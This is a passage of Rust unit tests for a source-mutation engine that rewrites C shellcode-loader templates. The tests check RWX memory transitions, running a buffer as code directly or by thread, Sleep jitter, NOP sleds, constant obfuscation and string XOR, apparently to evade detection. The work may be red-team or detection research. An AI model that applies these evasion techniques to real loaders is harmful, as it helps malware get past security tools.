        let spec = make_spec("ast.exec_decoy", &[("method", "direct")]);
        let (out, applied) = ast.apply(basic_template(), &[&spec]).unwrap();

        assert!(applied.contains(&"ast.exec_decoy".to_string()));
        assert!(out.contains("((void(*)())buf)()"));
    }

    #[test]
    fn test_exec_decoy_thread() {
        let mut ast = AstMutator::new().unwrap();
        let spec = make_spec("ast.exec_decoy", &[("method", "thread")]);
        let (out, applied) = ast.apply(basic_template(), &[&spec]).unwrap();

        assert!(applied.contains(&"ast.exec_decoy".to_string()));
        assert!(out.contains("CreateThread"));
        assert!(out.contains("WaitForSingleObject"));
        assert!(out.contains("CloseHandle"));
    }

    #[test]
    fn test_exec_decoy_none_noop() {
        let mut ast = AstMutator::new().unwrap();
        let spec = make_spec("ast.exec_decoy", &[("method", "none")]);
        let (out, applied) = ast.apply(basic_template(), &[&spec]).unwrap();

        // "none" makes no changes → not recorded as applied
        assert!(applied.is_empty());
        // "none" should not add any execution code
        assert!(!out.contains("((void(*)())buf)()"));
        assert!(!out.contains("CreateThread"));
    }

    #[test]
    fn test_timing_pattern() {
        let mut ast = AstMutator::new().unwrap();
        let spec = make_spec("ast.timing_pattern", &[("min_ms", "50"), ("max_ms", "200")]);
        let (out, applied) = ast.apply(basic_template(), &[&spec]).unwrap();

        assert!(applied.contains(&"ast.timing_pattern".to_string()));
        assert!(out.contains("Sleep(50 + (GetTickCount() % 150))"));
    }

    #[test]
    fn test_timing_pattern_defaults() {
        let mut ast = AstMutator::new().unwrap();
        let spec = make_spec("ast.timing_pattern", &[]);
        let (out, applied) = ast.apply(basic_template(), &[&spec]).unwrap();

        assert!(applied.contains(&"ast.timing_pattern".to_string()));
        // Default: min=10, max=100, range=90
        assert!(out.contains("Sleep(10 + (GetTickCount() % 90))"));
    }

    #[test]
    fn test_timing_pattern_two_markers() {
        let mut ast = AstMutator::new().unwrap();
        let spec = make_spec("ast.timing_pattern", &[("min_ms", "10"), ("max_ms", "100")]);
        let (out, _applied) = ast.apply(basic_template(), &[&spec]).unwrap();

        // basic.c has two @MUTATE:timing_pattern markers
        let sleep_count = out.matches("Sleep(").count();
        assert_eq!(
            sleep_count, 2,
            "Expected 2 Sleep() calls, got {}",
            sleep_count
        );
    }

    #[test]
    fn test_protection_rw_rwx() {
        let mut ast = AstMutator::new().unwrap();
        let spec = make_spec("ast.protection_transition", &[("pattern", "rw_rwx")]);
        let (out, applied) = ast.apply(basic_template(), &[&spec]).unwrap();

        assert!(applied.contains(&"ast.protection_transition".to_string()));
        assert!(out.contains("p_RWX"));
    }

    #[test]
    fn test_protection_staged() {
        let mut ast = AstMutator::new().unwrap();
        let spec = make_spec("ast.protection_transition", &[("pattern", "rw_r_rx")]);
        let (out, applied) = ast.apply(basic_template(), &[&spec]).unwrap();

        assert!(applied.contains(&"ast.protection_transition".to_string()));
        // Should have the original VirtualProtect plus an intermediate one
        let vp_count = out.matches("VirtualProtect").count();
        assert!(
            vp_count >= 2,
            "Expected at least 2 VirtualProtect calls, got {}",
            vp_count
        );
        assert!(out.contains("0x02")); // PAGE_READONLY
    }

    #[test]
    fn test_protection_default_noop() {
        let mut ast = AstMutator::new().unwrap();
        let spec = make_spec("ast.protection_transition", &[("pattern", "rw_rx")]);
        let (out, applied) = ast.apply(basic_template(), &[&spec]).unwrap();

        // Default "rw_rx" makes no changes → not recorded as applied
        assert!(applied.is_empty());
        // Default should not change anything
        assert!(out.contains("p_RX"));
        assert!(!out.contains("p_RWX"));
    }

    #[test]
    fn test_combined_mutations() {
        let mut ast = AstMutator::new().unwrap();

        let specs = [
            make_spec("ast.decon_rounds", &[("count", "50"), ("method", "fixed")]),
            make_spec("ast.fill_pattern", &[("pattern", "nop_sled")]),
            make_spec("ast.exec_decoy", &[("method", "direct")]),
        ];
        let refs: Vec<&MutationSpec> = specs.iter().collect();

        let (out, applied) = ast.apply(basic_template(), &refs).unwrap();

        assert_eq!(applied.len(), 3);
        assert!(out.contains("i < 50"));
        assert!(out.contains("0x90"));
        assert!(out.contains("((void(*)())buf)()"));
    }

    #[test]
    fn test_no_markers_graceful() {
        let mut ast = AstMutator::new().unwrap();
        let source = "int main() { return 0; }";
        let spec = make_spec("ast.decon_rounds", &[("count", "50")]);

        let (out, applied) = ast.apply(source, &[&spec]).unwrap();

        // No markers → no mutations applied, source unchanged
        assert!(applied.is_empty());
        assert_eq!(out, source);
    }

    #[test]
    fn test_unknown_mutation_skipped() {
        let mut ast = AstMutator::new().unwrap();
        let source = "// @MUTATE:unknown_thing\nint x = 42;";
        let spec = make_spec("ast.unknown_thing", &[]);

        let (out, applied) = ast.apply(source, &[&spec]).unwrap();

        // Unknown mutation makes no changes → not recorded as applied
        assert!(applied.is_empty());
        assert!(out.contains("int x = 42;"));
    }

    #[test]
    fn test_find_block_end() {
        let lines = vec![
            "        for (int k = 0; k < N; k++) {",
            "            buf[k] = 0;",
            "        }",
            "        next_statement();",
        ];
        assert_eq!(find_block_end(&lines, 0), 2);
    }

    #[test]
    fn test_find_block_end_nested() {
        let lines = vec![
            "        for (int k = 0; k < N; k++) {",
            "            if (k > 5) {",
            "                buf[k] = 1;",
            "            }",
            "        }",
            "        next();",
        ];
        assert_eq!(find_block_end(&lines, 0), 4);
    }

    // ── const_obfuscation unit tests ─────────────────────────────────────

    #[test]
    fn test_const_obfuscation_basic() {
        let mut ast = AstMutator::new().unwrap();
        let source = "void f() {\n    int x = 0x3000;\n}";
        let spec = make_spec("ast.const_obfuscation", &[]);
        let (out, applied) = ast.apply(source, &[&spec]).unwrap();

        assert!(applied.contains(&"ast.const_obfuscation".to_string()));
        assert!(out.contains("volatile unsigned long long __obf_c0_p"));
        assert!(out.contains("volatile unsigned long long __obf_c0 = __obf_c0_p +"));
        assert!(out.contains("(int)__obf_c0"));
        assert!(
            !out.contains("0x3000"),
            "Original constant should be replaced"
        );
    }

    #[test]
    fn test_const_obfuscation_skip_0_and_1() {
        let mut ast = AstMutator::new().unwrap();
        let source = "void f() {\n    int a = 0;\n    int b = 1;\n}";
        let spec = make_spec("ast.const_obfuscation", &[]);
        let (out, applied) = ast.apply(source, &[&spec]).unwrap();

        // 0 and 1 are below min_value=2, so nothing should change
        assert!(applied.contains(&"ast.const_obfuscation".to_string()));
        assert!(!out.contains("__obf_c"), "0 and 1 should not be obfuscated");
    }

    #[test]
    fn test_const_obfuscation_skip_preprocessor() {
        let mut ast = AstMutator::new().unwrap();
        let source = "#define MAGIC 0x3000\nvoid f() {\n    int x = 42;\n}";
        let spec = make_spec("ast.const_obfuscation", &[]);
        let (out, _) = ast.apply(source, &[&spec]).unwrap();

        // The #define constant should be preserved
        assert!(out.contains("#define MAGIC 0x3000"));
        // The local variable constant should be obfuscated
        assert!(out.contains("__obf_c0"));
        assert!(!out.contains("int x = 42;"), "42 should be replaced");
    }

    #[test]
    fn test_const_obfuscation_skip_array_size() {
        let mut ast = AstMutator::new().unwrap();
        let source = "void f() {\n    int arr[100];\n    int x = 50;\n}";
        let spec = make_spec("ast.const_obfuscation", &[]);
        let (out, _) = ast.apply(source, &[&spec]).unwrap();

        // Array size should be preserved
        assert!(out.contains("arr[100]"));
        // Regular constant should be obfuscated
        assert!(out.contains("__obf_c0"));
    }

    #[test]
    fn test_const_obfuscation_skip_case_label() {
        let mut ast = AstMutator::new().unwrap();
        let source =
            "void f() {\n    switch(x) {\n        case 10: break;\n    }\n    int y = 10;\n}";
        let spec = make_spec("ast.const_obfuscation", &[]);
        let (out, _) = ast.apply(source, &[&spec]).unwrap();

        // Case label should be preserved
        assert!(out.contains("case 10:"));
        // The assignment `int y = 10` should be obfuscated
        assert!(out.contains("__obf_c0"));
    }

    #[test]
    fn test_const_obfuscation_multiple_on_same_statement() {
        let mut ast = AstMutator::new().unwrap();
        let source = "void f() {\n    VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, 0x04);\n}";
        let spec = make_spec("ast.const_obfuscation", &[]);
        let (out, _) = ast.apply(source, &[&spec]).unwrap();

        // Both constants should be obfuscated with different counters
        assert!(out.contains("__obf_c0"));
        assert!(out.contains("__obf_c1"));
        assert!(!out.contains("0x3000"));
        assert!(!out.contains("0x04"));
    }

    #[test]
    fn test_const_obfuscation_deterministic() {
        let mut ast1 = AstMutator::new().unwrap();
        let mut ast2 = AstMutator::new().unwrap();
        let source = "void f() {\n    int x = 0x3000;\n}";
        let spec = make_spec("ast.const_obfuscation", &[("seed", "0xBEEF")]);

        let (out1, _) = ast1.apply(source, &[&spec]).unwrap();
        let (out2, _) = ast2.apply(source, &[&spec]).unwrap();

        assert_eq!(out1, out2, "Same seed should produce identical output");
    }

    #[test]
    fn test_const_obfuscation_volatile_sum_correctness() {
        // Verify split_value produces correct sums
        let test_values: &[u64] = &[0x3000, 0x8000, 0x40, 0xFF, 12288, 42];
        for &val in test_values {
            let (a, b) = split_value(val, 0xDEAD, 0);
            assert_eq!(
                a + b,
                val,
                "split_value({}) produced {} + {} = {} (expected {})",
                val,
                a,
                b,
                a + b,
                val
            );
        }
    }

    #[test]
    fn test_const_obfuscation_combined_with_string_xor() {
        let mut ast = AstMutator::new().unwrap();
        let source = r#"void f() {
    char *msg = "hello";
    int x = 0x3000;
}"#;
        let specs = [
            make_spec("ast.const_obfuscation", &[]),
            make_spec("ast.string_xor", &[]),
        ];
        let refs: Vec<&MutationSpec> = specs.iter().collect();
        let (out, applied) = ast.apply(source, &refs).unwrap();

        assert!(applied.contains(&"ast.const_obfuscation".to_string()));
        assert!(applied.contains(&"ast.string_xor".to_string()));
        assert!(out.contains("__obf_c0"), "Constant should be obfuscated");
        assert!(out.contains("xor_str_0"), "String should be XOR-encoded");
    }

    #[test]
    fn test_const_obfuscation_combined_with_marker_mutation() {
        let mut ast = AstMutator::new().unwrap();
        let specs = [
            make_spec("ast.decon_rounds", &[("count", "50"), ("method", "fixed")]),
            make_spec("ast.const_obfuscation", &[]),
        ];
        let refs: Vec<&MutationSpec> = specs.iter().collect();
        let (out, applied) = ast.apply(basic_template(), &refs).unwrap();

        assert!(applied.contains(&"ast.decon_rounds".to_string()));
        assert!(applied.contains(&"ast.const_obfuscation".to_string()));
        // decon_rounds replaces DECON_ROUNDS→50, then const_obfuscation replaces 50→(int)__obf_cN
        // So we check that 0x3000 and 0x8000 are obfuscated (the key goal)
        assert!(!out.contains("0x3000"), "0x3000 should be obfuscated");
        assert!(!out.contains("0x8000"), "0x8000 should be obfuscated");
        assert!(out.contains("__obf_c"));
    }

    #[test]
    fn test_const_obfuscation_custom_min_value() {
        let mut ast = AstMutator::new().unwrap();
        let source = "void f() {\n    int a = 5;\n    int b = 100;\n}";
        let spec = make_spec("ast.const_obfuscation", &[("min_value", "10")]);
        let (out, _) = ast.apply(source, &[&spec]).unwrap();

        // 5 < min_value=10 → should stay as-is
        assert!(
            out.contains("int a = 5;"),
            "5 should not be obfuscated (below min_value=10)"
        );
        // 100 >= min_value=10 → should be obfuscated
        assert!(out.contains("__obf_c0"));
    }

    #[test]
    fn test_const_obfuscation_idempotent() {
        let mut ast1 = AstMutator::new().unwrap();
        let source = "void f() {\n    int x = 0x3000;\n}";
        let spec = make_spec("ast.const_obfuscation", &[]);

        let (first_pass, _) = ast1.apply(source, &[&spec]).unwrap();

        let mut ast2 = AstMutator::new().unwrap();
        let (second_pass, _) = ast2.apply(&first_pass, &[&spec]).unwrap();

        assert_eq!(
            first_pass, second_pass,
            "Second pass should not double-obfuscate (idempotent)"
        );
    }

    #[test]
    fn test_const_obfuscation_hex_values() {
        let mut ast = AstMutator::new().unwrap();
        let source = "void f() {\n    int a = 0xFF;\n    int b = 0x3000;\n    int c = 0x8000;\n}";
        let spec = make_spec("ast.const_obfuscation", &[]);
        let (out, _) = ast.apply(source, &[&spec]).unwrap();

        assert!(out.contains("__obf_c0"), "0xFF should be obfuscated");
        assert!(out.contains("__obf_c1"), "0x3000 should be obfuscated");
        assert!(out.contains("__obf_c2"), "0x8000 should be obfuscated");
        assert!(!out.contains("0xFF"));
        assert!(!out.contains("0x3000"));
        assert!(!out.contains("0x8000"));
    }

    #[test]
    fn test_const_obfuscation_no_qualifying_constants() {
        let mut ast = AstMutator::new().unwrap();
        let source = "void f() {\n    int x = 0;\n    int y = 1;\n}";
        let spec = make_spec("ast.const_obfuscation", &[]);
        let (out, applied) = ast.apply(source, &[&spec]).unwrap();

        // No constants >= min_value=2 → applied (global mutation always records) but no changes
        assert!(applied.contains(&"ast.const_obfuscation".to_string()));
        assert!(!out.contains("__obf_c"), "No obfuscation should occur");
        assert!(out.contains("int x = 0;"));
        assert!(out.contains("int y = 1;"));
    }

    #[test]
    fn test_const_obfuscation_skip_initializer_list() {
        let mut ast = AstMutator::new().unwrap();
        let source =
            "void f() {\n    unsigned char arr[] = {0xAB, 0xCD, 0xEF};\n    int x = 0x3000;\n}";
        let spec = make_spec("ast.const_obfuscation", &[]);
        let (out, _) = ast.apply(source, &[&spec]).unwrap();

        // Initializer list values should be preserved
        assert!(out.contains("0xAB"));
        assert!(out.contains("0xCD"));
        assert!(out.contains("0xEF"));
        // Regular constant should be obfuscated
        assert!(!out.contains("0x3000"));
        assert!(out.contains("__obf_c0"));
    }

    #[test]
    fn test_const_obfuscation_skip_file_scope() {
        let mut ast = AstMutator::new().unwrap();
        let source = "int global = 100;\nvoid f() {\n    int local = 200;\n}";
        let spec = make_spec("ast.const_obfuscation", &[]);
        let (out, _) = ast.apply(source, &[&spec]).unwrap();

        // File-scope constant should be preserved
        assert!(out.contains("int global = 100;"));
        // Local constant should be obfuscated
        assert!(out.contains("__obf_c0"));
    }

    #[test]
    fn test_const_obfuscation_only_modifies_integers() {
        let mut ast = AstMutator::new().unwrap();
        let source = r#"#define BUFFER_SIZE 4096
// This function allocates memory
void setup(int mode) {
    char *name = "VirtualAlloc";
    float ratio = 3.14;
    int flags = 0x3000;
    int prot = 0x40;
    char *buf = (char*)VirtualAlloc(NULL, BUFFER_SIZE, flags, prot);
    if (!buf) return;
    memset(buf, 0, BUFFER_SIZE);
}"#;
        let spec = make_spec("ast.const_obfuscation", &[]);
        let (out, _) = ast.apply(source, &[&spec]).unwrap();

        // Strings preserved
        assert!(
            out.contains(r#""VirtualAlloc""#),
            "string literal was modified"
        );
        // Comments preserved
        assert!(
            out.contains("// This function allocates memory"),
            "comment was modified"
        );
        // Function names / identifiers preserved
        assert!(
            out.contains("void setup("),
            "function signature was modified"
        );
        // Float literal preserved
        assert!(out.contains("3.14"), "float literal was modified");
        // Preprocessor directive preserved
        assert!(
            out.contains("#define BUFFER_SIZE 4096"),
            "preprocessor define was modified"
        );
        // Trivial values preserved
        assert!(out.contains("NULL"), "NULL was modified");
        assert!(out.contains(", 0,"), "zero literal in memset was modified");
        // Integer constants are obfuscated
        assert!(
            !out.contains("0x3000"),
            "0x3000 should have been obfuscated"
        );
        assert!(!out.contains("0x40"), "0x40 should have been obfuscated");
        // Obfuscation variables present
        assert!(
            out.contains("__obf_c0"),
            "missing first obfuscation variable"
        );
        assert!(
            out.contains("__obf_c1"),
            "missing second obfuscation variable"
        );
        // String XOR not applied (only const_obfuscation requested)
        assert!(
            !out.contains("xor_str_"),
            "string XOR should not be applied"
        );
    }

    // ── inline_protection_macros tests ─────────────────────────────────

    #[test]
    fn test_const_obfuscation_inlines_protection_macros() {
        let mut ast = AstMutator::new().unwrap();
        let source = "\
#define p_RW  0x04
#define p_RX  0x20
#define p_RWX 0x40
void f() {
    VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
    VirtualProtect(buf, PAYLOAD_LEN, p_RX, &old_prot);
}";
        let spec = make_spec("ast.const_obfuscation", &[]);
        let (out, _) = ast.apply(source, &[&spec]).unwrap();

        // #define lines should be removed
        assert!(!out.contains("#define p_RW"));
        assert!(!out.contains("#define p_RX"));
        assert!(!out.contains("#define p_RWX"));
        // Macro identifiers should no longer appear
        assert!(!out.contains("p_RW"));
        assert!(!out.contains("p_RX"));
        // Values should be obfuscated (not plaintext)
        assert!(!out.contains("0x04"));
        assert!(!out.contains("0x20"));
        // Obfuscation variables should exist
        assert!(out.contains("__obf_c"));
    }

    #[test]
    fn test_const_obfuscation_after_protection_transition() {
        let mut ast = AstMutator::new().unwrap();
        let source = "\
#define p_RW  0x04
#define p_RX  0x20
#define p_RWX 0x40
void f() {
    char *buf = (char*)VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
    // @MUTATE:protection_transition
    VirtualProtect(buf, PAYLOAD_LEN, p_RX, &old_prot);
}";
        let specs = [
            make_spec("ast.protection_transition", &[("pattern", "rw_rwx")]),
            make_spec("ast.const_obfuscation", &[]),
        ];
        let spec_refs: Vec<&MutationSpec> = specs.iter().collect();
        let (out, applied) = ast.apply(source, &spec_refs).unwrap();

        assert!(applied.contains(&"ast.protection_transition".to_string()));
        assert!(applied.contains(&"ast.const_obfuscation".to_string()));
        // p_RWX (from protection_transition replacing p_RX) should now be obfuscated
        assert!(!out.contains("p_RWX"));
        assert!(!out.contains("0x40"));
        assert!(out.contains("__obf_c"));
    }

    #[test]
    fn test_parse_c_integer() {
        assert_eq!(parse_c_integer("0x3000"), Some(0x3000));
        assert_eq!(parse_c_integer("0X3000"), Some(0x3000));
        assert_eq!(parse_c_integer("0xFF"), Some(0xFF));
        assert_eq!(parse_c_integer("42"), Some(42));
        assert_eq!(parse_c_integer("42u"), Some(42));
        assert_eq!(parse_c_integer("42ULL"), Some(42));
        assert_eq!(parse_c_integer("0"), Some(0));
        assert_eq!(parse_c_integer("0b1010"), Some(10));
        assert_eq!(parse_c_integer("3.14"), None); // float
    }
}
